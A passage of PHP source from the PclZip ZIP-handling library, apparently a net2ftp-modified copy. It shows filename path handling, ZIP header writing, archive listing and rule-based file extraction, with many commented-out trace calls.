    }
    else {
      $p_remove_all_dir = 0;
    }

    // ----- Look for full name change
    if (isset($p_filedescr['new_full_name'])) {
      $v_stored_filename = $p_filedescr['new_full_name'];
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Changing full name of '".$p_filename."' for '".$v_stored_filename."'");
    }
    
    // ----- Look for path and/or short name change
    else {

      // ----- Look for short name change
      if (isset($p_filedescr['new_short_name'])) {
        $v_path_info = pathinfo($p_filename);
        $v_dir = '';
        if ($v_path_info['dirname'] != '') {
          $v_dir = $v_path_info['dirname'].'/';
        }
        $v_stored_filename = $v_dir.$p_filedescr['new_short_name'];
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Changing short name of '".$p_filename."' for '".$v_stored_filename."'");
      }
      else {
        // ----- Calculate the stored filename
        $v_stored_filename = $p_filename;
      }

      // ----- Look for all path to remove
      if ($p_remove_all_dir) {
        $v_stored_filename = basename($p_filename);
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Remove all path selected change '".$p_filename."' for '".$v_stored_filename."'");
      }
      // ----- Look for partial path remove
      else if ($p_remove_dir != "") {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Partial path to remove");
        if (substr($p_remove_dir, -1) != '/')
          $p_remove_dir .= "/";

        if (   (substr($p_filename, 0, 2) == "./")
            || (substr($p_remove_dir, 0, 2) == "./")) {
            
          if (   (substr($p_filename, 0, 2) == "./")
              && (substr($p_remove_dir, 0, 2) != "./")) {
            $p_remove_dir = "./".$p_remove_dir;
          }
          if (   (substr($p_filename, 0, 2) != "./")
              && (substr($p_remove_dir, 0, 2) == "./")) {
            $p_remove_dir = substr($p_remove_dir, 2);
          }
        }

        $v_compare = PclZipUtilPathInclusion($p_remove_dir,
                                             $v_stored_filename);
        if ($v_compare > 0) {
          if ($v_compare == 2) {
            $v_stored_filename = "";
            //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Path to remove is the current folder");
          }
          else {
            //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Remove path '$p_remove_dir' in file '$v_stored_filename'");
            $v_stored_filename = substr($v_stored_filename,
                                        strlen($p_remove_dir));
            //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Result is '$v_stored_filename'");
          }
        }
      }
      // ----- Look for path to add
      if ($p_add_dir != "") {
        if (substr($p_add_dir, -1) == "/")
          $v_stored_filename = $p_add_dir.$v_stored_filename;
        else
          $v_stored_filename = $p_add_dir."/".$v_stored_filename;
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Add path '$p_add_dir' in file '$p_filename' = '$v_stored_filename'");
      }
    }

    // ----- Filename (reduce the path of stored name)
    $v_stored_filename = PclZipUtilPathReduction($v_stored_filename);
    $p_filedescr['stored_filename'] = $v_stored_filename;
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Stored filename will be '".$p_filedescr['stored_filename']."', strlen ".strlen($p_filedescr['stored_filename']));
    
    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privWriteFileHeader()
  // Description :
  // Parameters :
  // Return Values :
  // --------------------------------------------------------------------------------
  function privWriteFileHeader(&$p_header)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privWriteFileHeader", 'file="'.$p_header['filename'].'", stored as "'.$p_header['stored_filename'].'"');
    $v_result=1;

    // ----- Store the offset position of the file
    $p_header['offset'] = ftell($this->zip_fd);
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, 'File offset of the header :'.$p_header['offset']);

    // ----- Transform UNIX mtime to DOS format mdate/mtime
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Date : \''.date("d/m/y H:i:s", $p_header['mtime']).'\'');
    $v_date = getdate($p_header['mtime']);
    $v_mtime = ($v_date['hours']<<11) + ($v_date['minutes']<<5) + $v_date['seconds']/2;
    $v_mdate = (($v_date['year']-1980)<<9) + ($v_date['mon']<<5) + $v_date['mday'];

    // ----- Packed data
    $v_binary_data = pack("VvvvvvVVVvv", 0x04034b50,
                              $p_header['version_extracted'], $p_header['flag'],
                          $p_header['compression'], $v_mtime, $v_mdate,
                          $p_header['crc'], $p_header['compressed_size'],
                                                  $p_header['size'],
                          strlen($p_header['stored_filename']),
                                                  $p_header['extra_len']);

    // ----- Write the first 148 bytes of the header in the archive
    fputs($this->zip_fd, $v_binary_data, 30);

    // ----- Write the variable fields
    if (strlen($p_header['stored_filename']) != 0)
    {
      fputs($this->zip_fd, $p_header['stored_filename'], strlen($p_header['stored_filename']));
    }
    if ($p_header['extra_len'] != 0)
    {
      fputs($this->zip_fd, $p_header['extra'], $p_header['extra_len']);
    }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privWriteCentralFileHeader()
  // Description :
  // Parameters :
  // Return Values :
  // --------------------------------------------------------------------------------
  function privWriteCentralFileHeader(&$p_header)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privWriteCentralFileHeader", 'file="'.$p_header['filename'].'", stored as "'.$p_header['stored_filename'].'"');
    $v_result=1;

    // TBC
    //for(reset($p_header); $key = key($p_header); next($p_header)) {
    //  //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "header[$key] = ".$p_header[$key]);
    //}

    // ----- Transform UNIX mtime to DOS format mdate/mtime
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Date : \''.date("d/m/y H:i:s", $p_header['mtime']).'\'');
    $v_date = getdate($p_header['mtime']);
    $v_mtime = ($v_date['hours']<<11) + ($v_date['minutes']<<5) + $v_date['seconds']/2;
    $v_mdate = (($v_date['year']-1980)<<9) + ($v_date['mon']<<5) + $v_date['mday'];

    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Comment size : \''.$p_header['comment_len'].'\'');

    // ----- Packed data
    $v_binary_data = pack("VvvvvvvVVVvvvvvVV", 0x02014b50,
                              $p_header['version'], $p_header['version_extracted'],
                          $p_header['flag'], $p_header['compression'],
                                                  $v_mtime, $v_mdate, $p_header['crc'],
                          $p_header['compressed_size'], $p_header['size'],
                          strlen($p_header['stored_filename']),
                                                  $p_header['extra_len'], $p_header['comment_len'],
                          $p_header['disk'], $p_header['internal'],
                                                  $p_header['external'], $p_header['offset']);

    // ----- Write the 42 bytes of the header in the zip file
    fputs($this->zip_fd, $v_binary_data, 46);

    // ----- Write the variable fields
    if (strlen($p_header['stored_filename']) != 0)
    {
      fputs($this->zip_fd, $p_header['stored_filename'], strlen($p_header['stored_filename']));
    }
    if ($p_header['extra_len'] != 0)
    {
      fputs($this->zip_fd, $p_header['extra'], $p_header['extra_len']);
    }
    if ($p_header['comment_len'] != 0)
    {
      fputs($this->zip_fd, $p_header['comment'], $p_header['comment_len']);
    }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privWriteCentralHeader()
  // Description :
  // Parameters :
  // Return Values :
  // --------------------------------------------------------------------------------
  function privWriteCentralHeader($p_nb_entries, $p_size, $p_offset, $p_comment)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privWriteCentralHeader", 'nb_entries='.$p_nb_entries.', size='.$p_size.', offset='.$p_offset.', comment="'.$p_comment.'"');
    $v_result=1;

    // ----- Packed data
    $v_binary_data = pack("VvvvvVVv", 0x06054b50, 0, 0, $p_nb_entries,
                              $p_nb_entries, $p_size,
                                                  $p_offset, strlen($p_comment));

    // ----- Write the 22 bytes of the header in the zip file
    fputs($this->zip_fd, $v_binary_data, 22);

    // ----- Write the variable fields
    if (strlen($p_comment) != 0)
    {
      fputs($this->zip_fd, $p_comment, strlen($p_comment));
    }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privList()
  // Description :
  // Parameters :
  // Return Values :
  // --------------------------------------------------------------------------------
  function privList(&$p_list)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privList", "list");
    $v_result=1;

    // ----- Magic quotes trick
    $this->privDisableMagicQuotes();

    // ----- Open the zip file
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Open file in binary read mode");
    if (($this->zip_fd = @fopen($this->zipname, 'rb')) == 0)
    {
      // ----- Magic quotes trick
      $this->privSwapBackMagicQuotes();
      
      // ----- Error log
      PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive \''.$this->zipname.'\' in binary read mode');

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
      return PclZip::errorCode();
    }

    // ----- Read the central directory informations
    $v_central_dir = array();
    if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
    {
      $this->privSwapBackMagicQuotes();
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }

    // ----- Go to beginning of Central Dir
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Offset : ".$v_central_dir['offset']."'");
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Position in file : ".ftell($this->zip_fd)."'");
    @rewind($this->zip_fd);
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Position in file : ".ftell($this->zip_fd)."'");
    if (@fseek($this->zip_fd, $v_central_dir['offset']))
    {
      $this->privSwapBackMagicQuotes();

      // ----- Error log
      PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
      return PclZip::errorCode();
    }
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Position in file : ".ftell($this->zip_fd)."'");

    // ----- Read each entry
    for ($i=0; $i<$v_central_dir['entries']; $i++)
    {
      // ----- Read the file header
      if (($v_result = $this->privReadCentralFileHeader($v_header)) != 1)
      {
        $this->privSwapBackMagicQuotes();
        //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
        return $v_result;
      }
      $v_header['index'] = $i;

      // ----- Get the only interesting attributes
      $this->privConvertHeader2FileInfo($v_header, $p_list[$i]);
      unset($v_header);
    }

    // ----- Close the zip file
    $this->privCloseFd();

    // ----- Magic quotes trick
    $this->privSwapBackMagicQuotes();

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privConvertHeader2FileInfo()
  // Description :
  //   This function takes the file informations from the central directory
  //   entries and extract the interesting parameters that will be given back.
  //   The resulting file infos are set in the array $p_info
  //     $p_info['filename'] : Filename with full path. Given by user (add),
  //                           extracted in the filesystem (extract).
  //     $p_info['stored_filename'] : Stored filename in the archive.
  //     $p_info['size'] = Size of the file.
  //     $p_info['compressed_size'] = Compressed size of the file.
  //     $p_info['mtime'] = Last modification date of the file.
  //     $p_info['comment'] = Comment associated with the file.
  //     $p_info['folder'] = true/false : indicates if the entry is a folder or not.
  //     $p_info['status'] = status of the action on the file.
  //     $p_info['crc'] = CRC of the file content.
  // Parameters :
  // Return Values :
  // --------------------------------------------------------------------------------
  function privConvertHeader2FileInfo($p_header, &$p_info)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privConvertHeader2FileInfo", "Filename='".$p_header['filename']."'");
    $v_result=1;

    // ----- Get the interesting attributes
    $p_info['filename'] = $p_header['filename'];
    $p_info['stored_filename'] = $p_header['stored_filename'];
    $p_info['size'] = $p_header['size'];
    $p_info['compressed_size'] = $p_header['compressed_size'];
    $p_info['mtime'] = $p_header['mtime'];
    $p_info['comment'] = $p_header['comment'];
    $p_info['folder'] = (($p_header['external']&0x00000010)==0x00000010);
    $p_info['index'] = $p_header['index'];
    $p_info['status'] = $p_header['status'];
    $p_info['crc'] = $p_header['crc'];

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privExtractByRule()
  // Description :
  //   Extract a file or directory depending of rules (by index, by name, ...)
  // Parameters :
  //   $p_file_list : An array where will be placed the properties of each
  //                  extracted file
  //   $p_path : Path to add while writing the extracted files
  //   $p_remove_path : Path to remove (from the file memorized path) while writing the
  //                    extracted files. If the path does not match the file path,
  //                    the file is extracted with its memorized path.
  //                    $p_remove_path does not apply to 'list' mode.
  //                    $p_path and $p_remove_path are commulative.
  // Return Values :
  //   1 on success,0 or less on error (see error code list)
  // --------------------------------------------------------------------------------
  function privExtractByRule(&$p_file_list, $p_path, $p_remove_path, $p_remove_all_path, &$p_options)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privExtractByRule", "path='$p_path', remove_path='$p_remove_path', remove_all_path='".($p_remove_all_path?'true':'false')."'");
    $v_result=1;

    // ----- Magic quotes trick
    $this->privDisableMagicQuotes();

    // ----- Check the path
    if (   ($p_path == "")
            || (   (substr($p_path, 0, 1) != "/")
                    && (substr($p_path, 0, 3) != "../")
                        && (substr($p_path,1,2)!=":/")))
// net2ftp
//      $p_path = "./".$p_path;

    // ----- Reduce the path last (and duplicated) '/'
    if (($p_path != "./") && ($p_path != "/"))
    {
      // ----- Look for the path end '/'
      while (substr($p_path, -1) == "/")
      {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Destination path [$p_path] ends by '/'");
        $p_path = substr($p_path, 0, strlen($p_path)-1);
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Modified to [$p_path]");
      }
    }

    // ----- Look for path to remove format (should end by /)
    if (($p_remove_path != "") && (substr($p_remove_path, -1) != '/'))
    {
      $p_remove_path .= '/';
    }
    $p_remove_path_size = strlen($p_remove_path);

    // ----- Open the zip file
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Open file in binary read mode");
    if (($v_result = $this->privOpenFd('rb')) != 1)
    {
      $this->privSwapBackMagicQuotes();
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }

    // ----- Read the central directory informations
    $v_central_dir = array();
    if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
    {
      // ----- Close the zip file
      $this->privCloseFd();
      $this->privSwapBackMagicQuotes();

      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }

    // ----- Start at beginning of Central Dir
    $v_pos_entry = $v_central_dir['offset'];

    // ----- Read each entry
    $j_start = 0;
    for ($i=0, $v_nb_extracted=0; $i<$v_central_dir['entries']; $i++)
    {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Read next file header entry : '$i'");

      // ----- Read next Central dir entry
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Position before rewind : ".ftell($this->zip_fd)."'");
      @rewind($this->zip_fd);
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Position after rewind : ".ftell($this->zip_fd)."'");
      if (@fseek($this->zip_fd, $v_pos_entry))
      {
        // ----- Close the zip file
        $this->privCloseFd();
        $this->privSwapBackMagicQuotes();

        // ----- Error log
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

        // ----- Return
        //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
        return PclZip::errorCode();
      }
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Position after fseek : ".ftell($this->zip_fd)."'");

      // ----- Read the file header
      $v_header = array();
      if (($v_result = $this->privReadCentralFileHeader($v_header)) != 1)
      {
        // ----- Close the zip file
        $this->privCloseFd();
        $this->privSwapBackMagicQuotes();

        //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
        return $v_result;
      }

      // ----- Store the index
      $v_header['index'] = $i;

      // ----- Store the file position
      $v_pos_entry = ftell($this->zip_fd);

      // ----- Look for the specific extract rules
      $v_extract = false;

      // ----- Look for extract by name rule
      if (   (isset($p_options[PCLZIP_OPT_BY_NAME]))
          && ($p_options[PCLZIP_OPT_BY_NAME] != 0)) {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Extract with rule 'ByName'");

          // ----- Look if the filename is in the list
          for ($j=0; ($j<sizeof($p_options[PCLZIP_OPT_BY_NAME])) && (!$v_extract); $j++) {
              //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Compare with file '".$p_options[PCLZIP_OPT_BY_NAME][$j]."'");

              // ----- Look for a directory
              if (substr($p_options[PCLZIP_OPT_BY_NAME][$j], -1) == "/") {
                  //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "The searched item is a directory");

                  // ----- Look if the directory is in the filename path
                  if (   (strlen($v_header['stored_filename']) > strlen($p_options[PCLZIP_OPT_BY_NAME][$j]))
                      && (substr($v_header['stored_filename'], 0, strlen($p_options[PCLZIP_OPT_BY_NAME][$j])) == $p_options[PCLZIP_OPT_BY_NAME][$j])) {
                      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "The directory is in the file path");
                      $v_extract = true;
                  }
              }
              // ----- Look for a filename
              elseif ($v_header['stored_filename'] == $p_options[PCLZIP_OPT_BY_NAME][$j]) {
                  //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "The file is the right one.");
                  $v_extract = true;
              }
          }
      }

      // ----- Look for extract by ereg rule
      else if (   (isset($p_options[PCLZIP_OPT_BY_EREG]))
               && ($p_options[PCLZIP_OPT_BY_EREG] != "")) {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Extract by ereg '".$p_options[PCLZIP_OPT_BY_EREG]."'");

          if (ereg($p_options[PCLZIP_OPT_BY_EREG], $v_header['stored_filename'])) {
              //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Filename match the regular expression");
              $v_extract = true;
          }
      }

      // ----- Look for extract by preg rule
      else if (   (isset($p_options[PCLZIP_OPT_BY_PREG]))
               && ($p_options[PCLZIP_OPT_BY_PREG] != "")) {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Extract with rule 'ByEreg'");

          if (preg_match($p_options[PCLZIP_OPT_BY_PREG], $v_header['stored_filename'])) {
              //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Filename match the regular expression");
              $v_extract = true;
          }
      }

      // ----- Look for extract by index rule
      else if (   (isset($p_options[PCLZIP_OPT_BY_INDEX]))
               && ($p_options[PCLZIP_OPT_BY_INDEX] != 0)) {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Extract with rule 'ByIndex'");
          
          // ----- Look if the index is in the list
          for ($j=$j_start; ($j<sizeof($p_options[PCLZIP_OPT_BY_INDEX])) && (!$v_extract); $j++) {
              //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Look if index '$i' is in [".$p_options[PCLZIP_OPT_BY_INDEX][$j]['start'].",".$p_options[PCLZIP_OPT_BY_INDEX][$j]['end']."]");

              if (($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['start']) && ($i<=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end'])) {
                  //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Found as part of an index range");
                  $v_extract = true;
              }
              if ($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end']) {
                  //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Do not look this index range for next loop");
                  $j_start = $j+1;
              }

              if ($p_options[PCLZIP_OPT_BY_INDEX][$j]['start']>$i) {
                  //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Index range is greater than index, stop loop");
                  break;
              }
          }
      }

      // ----- Look for no rule, which means extract all the archive
      else {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Extract with no rule (extract all)");
          $v_extract = true;
      }

          // ----- Check compression method
          if (   ($v_extract)
              && (   ($v_header['compression'] != 8)
                      && ($v_header['compression'] != 0))) {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Unsupported compression method (".$v_header['compression'].")");
          $v_header['status'] = 'unsupported_compression';

          // ----- Look for PCLZIP_OPT_STOP_ON_ERROR
          if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
                      && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {
              //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "PCLZIP_OPT_STOP_ON_ERROR is selected, extraction will be stopped");

              $this->privSwapBackMagicQuotes();
              
              PclZip::privErrorLog(PCLZIP_ERR_UNSUPPORTED_COMPRESSION,
                                               "Filename '".$v_header['stored_filename']."' is "
                                                           ."compressed by an unsupported compression "
                                                           ."method (".$v_header['compression'].") ");

              //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
              return PclZip::errorCode();
                  }
          }
          
          // ----- Check encrypted files
          if (($v_extract) && (($v_header['flag'] & 1) == 1)) {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Unsupported file encryption");
          $v_header['status'] = 'unsupported_encryption';

          // ----- Look for PCLZIP_OPT_STOP_ON_ERROR
          if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
                      && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {
              //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "PCLZIP_OPT_STOP_ON_ERROR is selected, extraction will be stopped");

              $this->privSwapBackMagicQuotes();

              PclZip::privErrorLog(PCLZIP_ERR_UNSUPPORTED_ENCRYPTION,
                                               "Unsupported encryption for "
                                                           ." filename '".$v_header['stored_filename']
                                                                   ."'");

              //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
              return PclZip::errorCode();
                  }
    }

      // ----- Look for real extraction
      if (($v_extract) && ($v_header['status'] != 'ok')) {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "No need for extract");
          $v_result = $this->privConvertHeader2FileInfo($v_header,
                                                        $p_file_list[$v_nb_extracted++]);
          if ($v_result != 1) {
              $this->privCloseFd();
              $this->privSwapBackMagicQuotes();
              //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
              return $v_result;
          }

          $v_extract = false;
      }
      
      // ----- Look for real extraction
      if ($v_extract)
      {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Extracting file '".$v_header['filename']."', index '$i'");

        // ----- Go to the file position
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Position before rewind : ".ftell($this->zip_fd)."'");
        @rewind($this->zip_fd);
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Position after rewind : ".ftell($this->zip_fd)."'");
        if (@fseek($this->zip_fd, $v_header['offset']))
        {
          // ----- Close the zip file
          $this->privCloseFd();

          $this->privSwapBackMagicQuotes();

          // ----- Error log
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

          // ----- Return
          //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
          return PclZip::errorCode();
        }
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Position after fseek : ".ftell($this->zip_fd)."'");

        // ----- Look for extraction as string
        if ($p_options[PCLZIP_OPT_EXTRACT_AS_STRING]) {

          // ----- Extracting the file
          $v_result1 = $this->privExtractFileAsString($v_header, $v_string);
          if ($v_result1 < 1) {
            $this->privCloseFd();
            $this->privSwapBackMagicQuotes();
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result1);
            return $v_result1;
          }

          // ----- Get the only interesting attributes
          if (($v_result = $this->privConvertHeader2FileInfo($v_header, $p_file_list[$v_nb_extracted])) != 1)
          {
            // ----- Close the zip file
            $this->privCloseFd();
            $this->privSwapBackMagicQuotes();

            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
            return $v_result;
          }

          // ----- Set the file content
          $p_file_list[$v_nb_extracted]['content'] = $v_string;

          // ----- Next extracted file
          $v_nb_extracted++;
          
          // ----- Look for user callback abort
          if ($v_result1 == 2) {
                break;
          }
        }
        // ----- Look for extraction in standard output
        elseif (   (isset($p_options[PCLZIP_OPT_EXTRACT_IN_OUTPUT]))
                        && ($p_options[PCLZIP_OPT_EXTRACT_IN_OUTPUT])) {
          // ----- Extracting the file in standard output
          $v_result1 = $this->privExtractFileInOutput($v_header, $p_options);
          if ($v_result1 < 1) {
            $this->privCloseFd();
            $this->privSwapBackMagicQuotes();
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result1);
            return $v_result1;
          }

          // ----- Get the only interesting attributes
          if (($v_result = $this->privConvertHeader2FileInfo($v_header, $p_file_list[$v_nb_extracted++])) != 1) {
            $this->privCloseFd();
            $this->privSwapBackMagicQuotes();
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
            return $v_result;
          }

          // ----- Look for user callback abort
          if ($v_result1 == 2) {
                break;
          }
        }
        // ----- Look for normal extraction
        else {
          // ----- Extracting the file
          $v_result1 = $this->privExtractFile($v_header,
                                                      $p_path, $p_remove_path,
                                                                                          $p_remove_all_path,
                                                                                          $p_options);
          if ($v_result1 < 1) {
            $this->privCloseFd();
            $this->privSwapBackMagicQuotes();
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result1);
            return $v_result1;
          }

          // ----- Get the only interesting attributes
          if (($v_result = $this->privConvertHeader2FileInfo($v_header, $p_file_list[$v_nb_extracted++])) != 1)
          {
            // ----- Close the zip file
            $this->privCloseFd();
            $this->privSwapBackMagicQuotes();

            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
            return $v_result;
          }

          // ----- Look for user callback abort
          if ($v_result1 == 2) {
                break;
          }
        }
      }
    }

    // ----- Close the zip file
    $this->privCloseFd();
    $this->privSwapBackMagicQuotes();

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privExtractFile()
  // Description :
  // Parameters :
  // Return Values :
  //
  // 1 : ... ?
  // PCLZIP_ERR_USER_ABORTED(2) : User ask for extraction stop in callback
  // --------------------------------------------------------------------------------
  function privExtractFile(&$p_entry, $p_path, $p_remove_path, $p_remove_all_path, &$p_options)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, 'PclZip::privExtractFile', "path='$p_path', remove_path='$p_remove_path', remove_all_path='".($p_remove_all_path?'true':'false')."'");
    $v_result=1;

    // ----- Read the file header
    if (($v_result = $this->privReadFileHeader($v_header)) != 1)
    {
      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }

    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Found file '".$v_header['filename']."', size '".$v_header['size']."'");

    // ----- Check that the file header is coherent with $p_entry info
    if ($this->privCheckFileHeaders($v_header, $p_entry) != 1) {
        // TBC
    }

    // ----- Look for all path to remove
    if ($p_remove_all_path == true) {
        // ----- Look for folder entry that not need to be extracted
        if (($p_entry['external']&0x00000010)==0x00000010) {
            //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "The entry is a folder : need to be filtered");

            $p_entry['status'] = "filtered";

